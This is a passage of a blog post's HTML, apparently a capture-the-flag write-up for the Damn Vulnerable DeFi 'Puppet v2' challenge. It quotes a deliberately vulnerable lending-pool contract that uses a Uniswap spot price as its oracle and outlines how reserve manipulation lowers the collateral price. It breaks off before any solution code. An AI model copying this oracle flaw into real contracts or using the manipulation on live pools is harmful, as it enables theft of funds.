@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #9 - Puppet v2 - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #9 - Puppet v2" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #9 - Puppet v2&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-13T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #9 - Puppet v2"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #9 - Puppet v2&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/" /><link rel="prev" href="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #9 - Puppet v2",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_09_puppetv2\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1435 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_09_puppetv2\/","datePublished": "2022-10-13T00:00:00+00:00","dateModified": "2022-10-13T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #9 - Puppet v2</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="October 13, 2022">October 13, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1435 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #9 - Puppet v2&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>The developers of the <a href="https://www.damnvulnerabledefi.xyz/challenges/8.html" target="_blank" rel="noopener noreffer ">last lending pool</a> are saying that they&rsquo;ve learned the lesson. And just released a new version!</p>
+<p>Now they&rsquo;re using a <a href="https://docs.uniswap.org/protocol/V2/introduction" target="_blank" rel="noopener noreffer ">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p>
+<p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;). (<a href="https://www.damnvulnerabledefi.xyz/challenges/9.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>For this challenge, we have only one contract: <code>PuppetV2Pool</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/puppet-v2/PuppetV2Pool.sol" target="_blank" rel="noopener noreffer ">source code</a>):
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">PuppetV2Pool</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">SafeMath</span> <span style="color:#00f">for</span> <span style="color:#00f">uint256</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#00f">private</span> <span style="color:#000">_uniswapPair</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#00f">private</span> <span style="color:#000">_uniswapFactory</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IERC20</span> <span style="color:#00f">private</span> <span style="color:#000">_token</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IERC20</span> <span style="color:#00f">private</span> <span style="color:#000">_weth</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">address</span> =&gt; <span style="color:#00f">uint256</span>) <span style="color:#00f">public</span> <span style="color:#000">deposits</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">Borrowed</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">borrower</span>, <span style="color:#00f">uint256</span> <span style="color:#000">depositRequired</span>, <span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>, <span style="color:#00f">uint256</span> <span style="color:#000">timestamp</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">wethAddress</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">tokenAddress</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">uniswapPairAddress</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">uniswapFactoryAddress</span>
+</span></span><span style="display:flex;"><span>    ) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_weth</span> = <span style="color:#000">IERC20</span>(<span style="color:#000">wethAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_token</span> = <span style="color:#000">IERC20</span>(<span style="color:#000">tokenAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_uniswapPair</span> = <span style="color:#000">uniswapPairAddress</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_uniswapFactory</span> = <span style="color:#000">uniswapFactoryAddress</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     *         Sender must have approved enough WETH in advance.
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     *         Calculations assume that WETH and borrowed token have same amount of decimals.
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">borrow</span>(<span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">_token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) &gt;= <span style="color:#000">borrowAmount</span>, <span style="color:#5a2">&#34;Not enough token balance&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Calculate how much WETH the user must deposit
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">uint256</span> <span style="color:#000">depositOfWETHRequired</span> = <span style="color:#000">calculateDepositOfWETHRequired</span>(<span style="color:#000">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Take the WETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">_weth</span>.<span style="color:#000">transferFrom</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#000">depositOfWETHRequired</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// internal accounting
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] += <span style="color:#000">depositOfWETHRequired</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">_token</span>.<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">borrowAmount</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">Borrowed</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">depositOfWETHRequired</span>, <span style="color:#000">borrowAmount</span>, <span style="color:#000">block</span>.<span style="color:#000">timestamp</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">calculateDepositOfWETHRequired</span>(<span style="color:#00f">uint256</span> <span style="color:#000">tokenAmount</span>) <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">_getOracleQuote</span>(<span style="color:#000">tokenAmount</span>).<span style="color:#000">mul</span>(<span style="color:#3af">3</span>) / (<span style="color:#3af">10</span> ** <span style="color:#3af">18</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Fetch the price from Uniswap v2 using the official libraries
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">_getOracleQuote</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        (<span style="color:#00f">uint256</span> <span style="color:#000">reservesWETH</span>, <span style="color:#00f">uint256</span> <span style="color:#000">reservesToken</span>) = <span style="color:#000">UniswapV2Library</span>.<span style="color:#000">getReserves</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_uniswapFactory</span>, <span style="color:#00f">address</span>(<span style="color:#000">_weth</span>), <span style="color:#00f">address</span>(<span style="color:#000">_token</span>)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">UniswapV2Library</span>.<span style="color:#000">quote</span>(<span style="color:#000">amount</span>.<span style="color:#000">mul</span>(<span style="color:#3af">10</span> ** <span style="color:#3af">18</span>), <span style="color:#000">reservesToken</span>, <span style="color:#000">reservesWETH</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<ul>
+<li><code>borrow</code> accepts the amount to borrow and:
+<ul>
+<li>checks if the pool has enough tokens to borrow (line <code>47</code>)</li>
+<li>computes the <code>WETH</code> deposit required to borrow the token amount requested. It calls the <code>calculateDepositOfWETHRequired</code> function (line <code>50</code>)</li>
+<li>transfers the <code>WETH</code> tokens required to the <code>weth</code> token contract (line <code>53</code>)</li>
+<li>updates the <code>deposits</code> variable for the <code>msg.sender</code> (line <code>56</code>)</li>
+<li>tranfers the tokens to <code>msg.sender</code> (line <code>58</code>)</li>
+</ul>
+</li>
+<li><code>calculateDepositOfWETHRequired</code> returns the deposit required as collateral. It calls <code>_getOracleQuote</code> to retrieve the price used in the formula <code>_getOracleQuote() * 3 / 10 ** 18</code></li>
+<li><code>_getOracleQuote</code> computes the token&rsquo;s price by using information from the Uniswap pair (line <code>69</code>). In particular, the price is calculated by using the <code>quote</code> function from the Uniswap library, which is defined as follows (<a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L36-L40" target="_blank" rel="noopener noreffer ">source code</a>):
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">function</span> <span style="color:#000">quote</span>(<span style="color:#00f">uint</span> <span style="color:#000">amountA</span>, <span style="color:#00f">uint</span> <span style="color:#000">reserveA</span>, <span style="color:#00f">uint</span> <span style="color:#000">reserveB</span>) <span style="color:#00f">internal</span> <span style="color:#00f">pure</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint</span> <span style="color:#000">amountB</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#000">require</span>(<span style="color:#000">amountA</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#39;UniswapV2Library: INSUFFICIENT_AMOUNT&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#000">require</span>(<span style="color:#000">reserveA</span> &gt; <span style="color:#3af">0</span> &amp;&amp; <span style="color:#000">reserveB</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#39;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amountB</span> = <span style="color:#000">amountA</span>.<span style="color:#000">mul</span>(<span style="color:#000">reserveB</span>) / <span style="color:#000">reserveA</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">How is the DVT price computed?</div>
+        </div>
+    </div>
+<p>The formulas involved are:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>price = _getOracleQuote(tokenAmount) * 3 / (10 ** 18);
+</span></span><span style="display:flex;"><span>_getOracleQuote(tokenAmount) = [amount * (10 ** 18)] * reservesWETH / reservesToken
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>=&gt; price = ([amount * (10 ** 18)] * reservesWETH / reservesToken) * 3 / (10 ** 18)
+</span></span><span style="display:flex;"><span>=&gt; price = (amount * reservesWETH / reservesToken) * 3</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>The price is indirectly proportional to the amount of <code>reservesToken</code>: if we increase the amount of <code>reservesToken</code>, the denominator in the formula will be higher, and thus the resulting value will be smaller.</p>
+<p>Here are the current balances:</p>
+<ul>
+<li>we have <code>20 ETH</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L22-L25" target="_blank" rel="noopener noreffer ">setup</a>) and <code>10000 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L15" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+<li>the Uniswap exchange has <code>10 WETH</code> and <code>100 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L12-L13" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+<li>the pool has <code>1000000 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet-v2/puppet-v2.challenge.js#L16" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+</ul>
+<p>The initial <code>WETH</code> deposit required to borrow <code>1000000 DVT</code> is <code> 300000 WETH</code>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
